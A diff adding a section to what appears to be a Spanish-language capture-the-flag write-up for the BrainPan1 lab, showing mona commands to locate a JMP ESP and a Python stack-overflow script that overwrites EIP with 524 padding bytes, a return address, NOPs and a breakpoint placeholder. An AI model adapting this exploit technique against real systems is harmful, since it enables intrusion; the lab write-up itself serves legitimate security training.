@@ -146,5 +146,41 @@ s.send(payload)
 s.recv(1024)
 s.close()
 ```
+<img src="https://github.com/El-Palomo/BrainPan1/blob/main/brain5.jpg" width="60%"></img>
+
+### Controlando Registro EIP
+
+#### Obtenemos el JMP ESP
+```
+!mona modules
+```
+<img src="https://github.com/El-Palomo/BrainPan1/blob/main/brain6.jpg" width="60%"></img>
+
+
+Debido a que el TARGET final es un LINUX escogemos el modulo:
+```
+!mona find -type instr -s "jmp esp" -m brainpan.exe
+```
+<img src="https://github.com/El-Palomo/BrainPan1/blob/main/brain7.jpg" width="60%"></img>
+
+```
+import sys, socket
+import struct
+
+buf = "A" * 524
+ret = struct.pack("I", 0x311712F3)
+nops = "\x90" * 32
+shell = "\xCC"
+
+payload = buf + ret + nops + shell
+
+target = ('127.0.0.1', 9999)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(target)
+s.recv(1024)
+s.send(payload)
+s.recv(1024)
+s.close()
+```
 
 
